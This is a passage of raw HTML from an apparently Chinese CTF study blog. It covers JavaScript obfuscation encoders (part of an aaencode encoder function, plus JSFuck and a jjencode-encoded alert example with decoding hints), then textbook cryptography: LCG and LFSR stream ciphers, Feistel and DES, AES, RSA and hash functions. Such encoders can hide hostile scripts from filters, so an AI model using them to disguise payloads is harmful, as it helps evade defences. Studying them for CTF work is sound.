+&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+&quot;+        &quot;((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+&quot;+        &quot;((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];&quot;+        &quot;(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+&quot;+        &quot;((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+&quot;+        &quot;((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; &quot;+        &quot;(ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\\\&#39;; &quot;+        &quot;(ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];&quot;+         &quot;(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];&quot;+//TODO        &quot;(ﾟДﾟ) [ﾟoﾟ]=&#39;\\\&quot;&#39;;&quot;+         &quot;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+&quot;;    r += &quot;(ﾟДﾟ)[ﾟoﾟ]+ &quot;;    for( var i = 0; i &lt; text.length; i++ )&#123;        n = text.charCodeAt( i );        t = &quot;(ﾟДﾟ)[ﾟεﾟ]+&quot;;        if( n &lt;= 127 )&#123;            t += n.toString( 8 ).replace( /[0-7]/g, function(c)&#123; return b[ c ] + &quot;+ &quot;; &#125; );        &#125;else&#123;            var m = /[0-9a-f]&#123;4&#125;$/.exec( &quot;000&quot; + n.toString(16 ) )[0];            t += &quot;(oﾟｰﾟo)+ &quot; + m.replace( /[0-9a-f]/gi, function(c)&#123; return b[ parseInt( c,16 ) ] + &quot;+ &quot;; &#125; );        &#125;        r += t;    &#125;    r += &quot;(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);&quot;;    return r;&#125;</code></pre><h4 id="2）JSFUCK"><a href="#2）JSFUCK" class="headerlink" title="2）JSFUCK"></a>2）JSFUCK</h4><p>日本安全研究人员<code>长谷川阳介</code>制作了名为<code>JSF*ck</code>的编码器，能够将所有JS代码用6个字符（分别是<strong><code>[</code>、<code>]</code>、<code>(</code>、<code>)</code>、<code>!</code>、<code>+</code></strong>）来表示（称之为<strong>用6个字符来混淆JavaScript</strong>）。</p><h4 id="3）JJEncode"><a href="#3）JJEncode" class="headerlink" title="3）JJEncode"></a>3）JJEncode</h4><p>jjencode同样又<code>长谷川阳介</code>先生创建，只是与JSFuck的创建时间不同</p><p>jjencode创建于2009年7月，JSFuck则是2010年底；jjencode先于JSFuck，而在混淆能力上，jjencode弱于JSFuck——jjencode将JS代码混淆为<strong><code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code> 这18个字符的排列组合</strong></p><p>可以说jjencode是JSFuck的早期弱化版本</p><blockquote><p>Perl语言有ppencode混淆、Ruby语言有rrencode，所以从jjencode的命名也能看出这是最初的JS混淆</p></blockquote><p>将任何合法的JavaScript代码进行编码。编码后的JS代码仅由符号组成的。</p><p>编码前：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">alert(<span class="hljs-string">&quot;Hello, JavaScript&quot;</span> )<br></code></pre></td></tr></table></figure><p>编码后：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span>=~[];<span class="hljs-variable">$</span>=&#123;___:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],__<span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$_:</span>(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],_<span class="hljs-variable">$_:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>:(<span class="hljs-variable">$</span>[<span class="hljs-variable">$</span>]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],_<span class="hljs-variable">$</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_:</span>(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$__:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$_</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$__:</span>(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span>],<span class="hljs-variable">$</span><span class="hljs-variable">$_:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>,<span class="hljs-variable">$___:</span>++<span class="hljs-variable">$</span>,<span class="hljs-variable">$__</span><span class="hljs-variable">$</span>:++<span class="hljs-variable">$</span>&#125;;<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>=(<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>=<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>]+(<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>=<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>=(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+((!<span class="hljs-variable">$</span>)+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>]+(<span class="hljs-variable">$</span>.__=<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>])+(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">.__</span><span class="hljs-variable">$</span>])+(<span class="hljs-variable">$</span>._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>])+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span>[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span><span class="hljs-variable">$</span>]+<span class="hljs-variable">$</span>.__+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>;<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>=<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>]+<span class="hljs-variable">$</span>.__+<span class="hljs-variable">$</span>._+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>;<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>=(<span class="hljs-variable">$</span>.___)[<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span>][<span class="hljs-variable">$</span><span class="hljs-type">.</span><span class="hljs-variable">$_</span>];<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span>(<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span>+<span class="hljs-string">&quot;\&quot;</span><span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+(![]+&quot;</span><span class="hljs-string">&quot;)[<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>]+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+&quot;</span>\\<span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.__+&quot;</span>(\\\<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>]+(![]+<span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-variable">$</span><span class="hljs-type">._</span><span class="hljs-variable">$_</span>]+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;,\\&quot;</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$__</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$</span><span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$__</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>._<span class="hljs-variable">$_</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$_</span><span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+<span class="hljs-variable">$</span>.__<span class="hljs-variable">$</span>+<span class="hljs-variable">$</span>.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$</span>.___+<span class="hljs-variable">$</span>.__+<span class="hljs-string">&quot;\\\&quot;</span>\\<span class="hljs-string">&quot;+<span class="hljs-variable">$</span>.<span class="hljs-variable">$__</span>+<span class="hljs-variable">$</span>.___+&quot;</span>)<span class="hljs-string">&quot;+&quot;</span>\<span class="hljs-string">&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><p><strong>JSFuck</strong>：仅由 <code>[]()+!</code> 六个字符组成</p></li><li><p><strong>aaencode</strong>：颜文字编码</p></li><li><p><strong>jjencode</strong>：由<code>[]()!+,\&quot;$.:;_&#123;&#125;~=</code> 18个字符组成，自定义能力强</p><blockquote><p>明显特征为开头的 <code>全局变量=~[];</code>，默认的全局变量为 <code>$</code></p></blockquote></li><li><p>解码方法：<code>.toString()</code>；<strong>hook function constructor</strong>；在线网站解码</p></li></ul><h2 id="0x02-流密码"><a href="#0x02-流密码" class="headerlink" title="0x02 流密码"></a>0x02 流密码</h2><h3 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h3><p>𝑚 表示原始数据，𝑐 表示加密后数据，𝑘 表示密钥，大写 E 表示二进制的运算（也可称为函数、算子），那么对于一个流加密我们可以表示为 $𝑐<em>𝑖 = 𝐸(𝑚</em>𝑖,𝑘_𝑖)$ , 其中 𝑖 = 0, 1, 2, . . . 表示是第几位。</p><p>我们可以看到流密码的核心就是设计 E 和密钥流。但是由于是<strong>位运算</strong>，E 也没有什么好设计的，通常会用<strong>异或运算</strong>，异或运算好处是加解密都可以用这个运算。那么流密码的设计将归结为密钥的设计，就是设计如何产生一个密钥流 $𝑘_𝑖 = 𝐺(𝑠) ;\quad 𝑖=0,1,2,…$, s 是密钥产生的种子 (seeds), 也就是产生密钥流的一个初始值，G(generator) 是密钥生成算法，可见 s 是整个算法的秘密。</p><p>流密码的加解密可以写为：</p><script type="math/tex; mode=display">\begin{cases}𝐺(𝑠) ⊕ 𝑚_𝑖 = 𝑐_𝑖 \\𝐺(𝑠) ⊕ 𝑐_𝑖 = 𝑚_𝑖\end{cases}</script><h3 id="2、密钥的产生"><a href="#2、密钥的产生" class="headerlink" title="2、密钥的产生"></a>2、密钥的产生</h3><p>根据香浓的完全安全系统的定义，如果密钥流是一个随机数，那么就可以构成一个完全安全加密系统，但是无法达到这个要求，所以通常我们会用伪随机数发生器PRG(pesudo-random generator ) 来产生密钥流。</p><h4 id="1）线性同余发生器-LCG-linear-congruential-generator"><a href="#1）线性同余发生器-LCG-linear-congruential-generator" class="headerlink" title="1）线性同余发生器 LCG(linear congruential generator)"></a>1）线性同余发生器 LCG(linear congruential generator)</h4><p>可以利用 $𝑥<em>𝑛 = (𝑎𝑥</em>{𝑛-1} + 𝑏) \ 𝑚𝑜𝑑 \ 𝑚$ 产生一个周期不超过 m 的伪随机数序列，$𝑥_0$ 为种 子 (seed)，也就是密钥。 LCG 不用在密码学中，因其在 1977 年被 J.A. Reeds 破译，也就是找到预测的方法， 但是其在一些需要产生随机数的场合下依然有应用，比如在一些测试中。</p><h4 id="2）线性反馈移位寄存器-LSFR-Linear-Feedback-shift-register"><a href="#2）线性反馈移位寄存器-LSFR-Linear-Feedback-shift-register" class="headerlink" title="2）线性反馈移位寄存器 LSFR(Linear Feedback shift register)"></a>2）线性反馈移位寄存器 LSFR(Linear Feedback shift register)</h4><p>线性反馈移位寄存器图形化表示方法：</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/3cbdd2ffd1e3b7cafec2d5ac44188ce4.png" alt="image-20211122203017530"></p><p>一个 LFSR 可以用一元多项式来表示, 移位寄存器与多项式的对应一般对应关系如图所示：</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/14d7d3482efb1ad0d16a31b89d4b71a6.png" alt="image-20211122204106321"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/15c2effc7adf8fd8026847014510b72d.png" alt="image-20211122203438241"></p><p>第一个三位移位寄存器，其对应的多项式可表示为: $𝑥^3 + 1$ ；第二个三位移位寄存器，其对应的多项式可以表示为：$𝑥^3 + 𝑥 + 1$。 </p><p><img src="/2021/11/20/CTF/Crypto/Crypto/ac925a88f21cdb65ebd58ae7f6abe3cf.png" alt="image-20211122203327613"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/24434b29e600a274424be16c4b39b20f.png" alt="image-20211122203358953"></p><p>我们希望在一定的资源配置下，能够得到周期最长的伪随机序列。</p><ul><li><p><strong>LFSR 最大周期：</strong>n 级 LFSR 产生的序列最大周期为 $2^𝑛 − 1$ ，我们将最大周期序列，称为 m 序列。 </p></li><li><p><strong>LFSR 最大周期必要条件：</strong>n 级 LFSR 产生的序列最大周期 $2^𝑛 − 1$ 的必要条件是其特征多项式是不可约的。 </p></li><li><p><strong>m 序列充要条件：</strong>若 n 次不可约多项式 p(x) 的阶为 $2^𝑛 − 1$，则称 p(x) 为 n 次本原多项式。</p></li></ul><p>Partow 的网站：<a href="https://www.partow.net/programming/polynomials/index.html">https://www.partow.net/programming/polynomials/index.html</a></p><h2 id="0x03-分组密码（DES）"><a href="#0x03-分组密码（DES）" class="headerlink" title="0x03 分组密码（DES）"></a>0x03 分组密码（DES）</h2><h3 id="1、Feistel-密码结构"><a href="#1、Feistel-密码结构" class="headerlink" title="1、Feistel 密码结构"></a>1、Feistel 密码结构</h3><p>很多分组密码的结构从本质上说都是基于一个称为Feistel 网络的结构。Feistel 提出利用乘积密码可获得简单的代换密码， 乘积密码指顺序地执行两个或多个基本密码系统， 使得最后结果的密码强度高于每个基本密码系统产生的结果， Feistel 还提出了实现代换和置换的方法。其思想实际上是Shannon 提出的利用乘积密码实现混淆和扩散思想的具体应用。</p><p><strong>Feistel 网络图解：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/96efacbddb6d2b458622e805f6eab73d.png" alt="image-20211122204316739" style="zoom:50%;"></p><p><strong>Feistel 网络第i轮数学表达式：</strong></p><script type="math/tex; mode=display">\begin{cases}L_i = R_{i-1} \\R_i = L_{i-1} ⊕ F(R_{i-1},K_i)\end{cases}</script><p><strong>Feistel 加解密过程：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/2ac77d8bac9d8cd11ef692b02d652e24.png" alt="image-20211122204522044" style="zoom:50%;"></p><h3 id="2、DES"><a href="#2、DES" class="headerlink" title="2、DES"></a>2、DES</h3><p>DES 是 Data Encryption Standard 的缩写，中文翻译为“数据加密标准”，其明文分组长度为 64 比特，密钥长为 56 比特，密文长度 64 比特。 DES 的加密算法框图如图所示，DES 首先将输入的 64 比特明文进行初始置换，然后将 64 比特分为左 32 比特 𝐿𝑖 和右 32 比特 𝑅𝑖 , 然后进行一轮处理，处理完后，刚开始分出来的右边 32 比特做为下一轮处理的左 32 比特，也就是 $L<em>i = R</em>{i-1}$，下一轮的右 32 比特为 $R<em>i = L</em>{i-1} ⊕ F(R_{i-1},K_i)$, 依次进行 16 轮这样的变换，然后进行逆初始置换，形成最终的密文。</p><p><strong>DES 加密过程：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/1ff0901942bab57f24e2ab6d313ec3b2.png" alt="image-20211122215845237" style="zoom:67%;"></p><h4 id="1）初始置换"><a href="#1）初始置换" class="headerlink" title="1）初始置换"></a>1）初始置换</h4><p>初始置换 IP 初始置换输入是 64bit，输出也是 64bit，初始置换表中元素表示 64bit 中 的第几个，原始顺序是 1, 2, 3, . . . , 63, 64，置换表就是调换后的顺序，其顺序是由左至右， 由上到下。逆初始置换表也是同样的含义。</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/c4440e5f47c7e98e54195d616916ede1.png" alt="image-20211122210423865" style="zoom:50%;"></p><h4 id="2）轮结构"><a href="#2）轮结构" class="headerlink" title="2）轮结构"></a>2）轮结构</h4><p>轮结构 (f 函数) 处理过程如图所示。 轮结构中有两个置换 E 和 P，E 置换输入 32bit，输出 48bit，是将其中一些位重复， 并进行重排，利用扩展表形式表示。P 变换输入 32bit，输出 32bit，只是将比特位进行了重排，如上图所示。</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/b41d704a8b0b90ec4f61ebe60fadb821.png" alt="image-20211122210156702" style="zoom:50%;"></p><p>轮结构中的 S 盒是 DES 中重要的设计部分，DES 中共有 8 个 S 盒，每个 S 盒输入 6bit，输出 4bit。</p><p>对于一个 S 盒的 6bit 输入，第一位和第六位，用来选择 S 盒中的一种代换方法，所以一个 S 盒共定义了四种代换方法，输入的另外4 bit,用来确定其输出数据，我们从 S 定义表中的输出数据区可以看到，输出的最大数据为 15，最小为 0， 这与输出是个 4bit 数据相符。</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/c571a58de704a7a39023f68827352b0d.png" alt="image-20211122220552653"></p><h4 id="3）密钥生成"><a href="#3）密钥生成" class="headerlink" title="3）密钥生成"></a>3）密钥生成</h4><p><strong>密钥生成过程：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/9fa7ceae1306d7d99102d65a188069ca.png" alt="image-20211122221026078" style="zoom:67%;"></p><p>DES 初始密钥 K 是一个 64 位的二进制块，其中有 8 位奇偶校验位。</p><p>对 DES 的 64 比特初始密钥进行置换选择 1(PC-1) 有两个作用： 一是将分别位于 8、16、24、32、40、48、56、64 的校验位去掉。 二是对剩余 56 比特进行换位。</p><p>$𝐶_0$ 和 $𝐷_0$ 是将换位后的 56 比特密钥分为两半，各为 28 比特。$𝐿𝑆_i$ 是循环左移变换，具体移位位数见下表。</p><p><img src="/2021/11/20/CTF/Crypto/Crypto/583a46495a4bc2a4f8559034ee4e15b2.png" alt="image-20211122210250965" style="zoom:50%;"></p><h4 id="4）解密"><a href="#4）解密" class="headerlink" title="4）解密"></a>4）解密</h4><p>在经过所有的代替、置换、异或和循环移动之后, 你或许认为解密算法与加密算法完全不同, 并且也像加密算法一样要有很强的混乱效果。恰恰相反, 经过精心选择各种运算, 获得了这样一个非常有用的性质: 加密和解密可使用相同的算法。</p><p>DES 使得用相同的函数来加密或解密每个分组成为可能。两者的唯之不同是密钥的次序相反。</p><h3 id="3、多重-DES"><a href="#3、多重-DES" class="headerlink" title="3、多重 DES"></a>3、多重 DES</h3><p>二重DES、两个密钥的三重DES、三个密钥的三重DES</p><h3 id="4、分组密码的运行模式"><a href="#4、分组密码的运行模式" class="headerlink" title="4、分组密码的运行模式"></a>4、分组密码的运行模式</h3><p><img src="/2021/11/20/CTF/Crypto/Crypto/1e11b62795b80bafca39e804ef74ad0d.png" alt="image-20211122222105510" style="zoom:80%;"></p><h3 id="5、AES"><a href="#5、AES" class="headerlink" title="5、AES"></a>5、AES</h3><p>AES的全称是Advanced Encryption Standard，意思是高级加密标准。它的出现主要是为了取代DES加密算法的，因为我们都知道DES算法的密钥长度是56Bit，因此算法的理论安全强度是2的56次方。但二十世纪中后期正是计算机飞速发展的阶段，元器件制造工艺的进步使得计算机的处理能力越来越强，虽然出现了3DES的加密方法，但由于它的加密时间是DES算法的3倍多，64Bit的分组大小相对较小，所以还是不能满足人们对安全性的要求。于是1997年1月2号，美国国家标准技术研究所宣布希望征集高级加密标准，用以取代DES。AES也得到了全世界很多密码工作者的响应，先后有很多人提交了自己设计的算法。最终有5个候选算法进入最后一轮：Rijndael，Serpent，Twofish，RC6和MARS。最终经过安全性分析、软硬件性能评估等严格的步骤，Rijndael算法获胜。</p><h2 id="0x04-公钥密码体制（RSA）"><a href="#0x04-公钥密码体制（RSA）" class="headerlink" title="0x04 公钥密码体制（RSA）"></a>0x04 公钥密码体制（RSA）</h2><p>在公钥密码体制以前的整个密码学史中， 所有的密码算法， 包括原始手工计算的、由机械设备实现的以及由计算机实现的， 都是<strong>基于代换和置换</strong>这两个基本工具。而公钥密码体制则为密码学的发展提供了新的理论和技术基础， 一方面， 公钥密码算法的基本工具不再是代换和置换， 而是<strong>数学函数</strong>； 另一方面， 公钥密码算法<strong>以非对称的形式使用两个密钥</strong>， 两个密钥的使用对保密性、密钥分配、认证等都有着深刻的意义。可以说， 公钥密码体制的出现在密码学史上是一个最大的而且是唯一真正的革命。</p><p>公钥密码体制的概念是在<strong>解决单钥密码体制中最难解决的两个问题</strong>时提出的， 这两个问题是<strong>密钥分配和数字签字</strong>。</p><p>单钥密码体制在进行密钥分配时，要求通信双方或者已经有一个共享的密钥， 或者可借助于一个密钥分配中心。对第一个要求， 常常可用人工方式传送双方最初共享的密钥， 这种方法成本很高， 而且还完全依赖于信使的可靠性。第二个要求则完全依赖于密钥分配中心的可靠性。</p><p>第二个问题数字签字考虑的是如何为数字化的消息或文件提供一种类似于为书面文件手书签字的方法。</p><p>1976 年W. Diffie 和M. Hellman 对解决上述两个问题获得了突破， 从而提出了公钥密码体制。</p><h3 id="1、MH-方法"><a href="#1、MH-方法" class="headerlink" title="1、MH 方法"></a>1、MH 方法</h3><p>1978 年，美国斯坦福大学的 R. C. Merkle 和 M. E. Hellman 在”Hiding information and signatures in trapdoor knapsacks” 一文中，建立了一种基于陷门背包的公钥密码系统。</p><h3 id="2、RSA"><a href="#2、RSA" class="headerlink" title="2、RSA"></a>2、RSA</h3><p>RSA 算法是1978 年由R. Rivest 、A. Shamir 和L. Adleman 提出的一种用数论构造的、也是迄今为止理论上最为成熟完善的公钥密码体制， 该体制已得到广泛的应用。</p><p>RSA 依赖的困难问题是：整数分解为素数是个困难问题，或者说素分解是个计算上困难的问题。 但是如果有一组素数，计算出这组素数的合数，却是一个容易的问题。 需要注意的是，虽然 RSA 计算困难问题基于的“整数分解”，但是 RSA 破解并不等价于“整数分解问题”。</p><h4 id="1）密钥"><a href="#1）密钥" class="headerlink" title="1）密钥"></a>1）密钥</h4><ul><li><p>用户选取两个不同的大素数 𝑝 和 𝑞</p></li><li><p>计算 𝑛 = 𝑝𝑞,  𝜙(𝑛) = (𝑝 − 1) (𝑞 − 1) 。其中 𝜙(𝑛) 是 n 的欧拉函数值。</p></li><li>选一个正整数 𝑒，满足 1&lt; 𝑒 &lt; 𝜙(𝑛) 且 𝑔𝑐𝑑(𝜙(𝑛)，𝑒) = 1 </li><li>计算 𝑒 模 𝜙(𝑛) 的逆元 𝑑，也就是说 𝑒𝑑 = 1 𝑚𝑜𝑑 𝜙(𝑛)</li><li>(𝑒, 𝑛) 做为公钥，(𝑑, 𝑛) 做为私钥</li></ul><h4 id="2）加密"><a href="#2）加密" class="headerlink" title="2）加密"></a>2）加密</h4><p>加密时首先将明文比特串分组， 使得每个分组对应的十进制数小于 n，即分组长度小于 $\log_2 n$ 。然后对每个明文分组 m，作加密运算：</p><script type="math/tex; mode=display">c = m^e \quad (mod \ n)</script><blockquote><p>RSA是分组加密，取一个明文分组 𝑀，0 ≤ 𝑀 ≤ 𝑛−1,𝐶 = 𝑀^𝑒 (𝑚𝑜𝑑 𝑛)。 </p></blockquote><h4 id="3）解密"><a href="#3）解密" class="headerlink" title="3）解密"></a>3）解密</h4><p>对密文分组的解密运算为：</p><script type="math/tex; mode=display">m = c^d \quad (mod \ n)</script><h2 id="0x05-哈希函数（MD5）"><a href="#0x05-哈希函数（MD5）" class="headerlink" title="0x05 哈希函数（MD5）"></a>0x05 哈希函数（MD5）</h2><h3 id="1、哈希函数定义"><a href="#1、哈希函数定义" class="headerlink" title="1、哈希函数定义"></a>1、哈希函数定义</h3><p>哈希函数 H 是一公开函数，用于将任意长的消息 M 映射为较短的、固定长度的一个值 H(M) ，作为认证符，称函数值 H(M) 为哈希值或哈希码或消息摘要。哈希码是消息中所有比特的函数，因此提供了一种错误检测能力，即改变消息中任何一个比特或几个比特都会使哈希码发生改变。</p><h3 id="2、哈希函数特点"><a href="#2、哈希函数特点" class="headerlink" title="2、哈希函数特点"></a>2、哈希函数特点</h3><p>哈希函数的目的是为需认证的数据产生一个“指纹” 。为了能够实现对数据的认证，哈希函数应满足以下性质：</p><ul><li><p>函数的输人可以是任意长，函数的输出是固定长。</p></li><li><p>已知 x ，求 H(x) 较为容易，可用硬件或软件实现。</p></li><li><p>已知 h，求使得 H(x) = h 的 x 在计算上是不可行的。</p><blockquote><p>这一性质称为函数的单向性，称 H(x) 为单向哈希函数。 </p></blockquote></li><li><p>已知 x ，找出 y （x!=y），使得 𝐻(x) = 𝐻(y) 在计算上是不可行的。</p><blockquote><p>如果单向哈希函数满足这一性质， 则称其为弱单向哈希函数。</p></blockquote></li><li><p>找出任意两个不同的输入 想 x、y ， 使得 𝐻(x) = 𝐻(y) 在计算上是不可行的。</p><blockquote><p>如果单向哈希函数满足这一性质， 则称其为强单向哈希函数。</p></blockquote></li></ul><h3 id="3、MD5"><a href="#3、MD5" class="headerlink" title="3、MD5"></a>3、MD5</h3><p>MD5 是 Ron Rivest 在 1990 年 10 月作为 RFC 提出的 (RFC 1321)，其前身是 MD4(RFC 1320)。MD5 输入为任意长度的信息，输出 128bit 的摘要信息 (散列值)。</p><h4 id="MD5-算法"><a href="#MD5-算法" class="headerlink" title="MD5 算法"></a>MD5 算法</h4><p><img 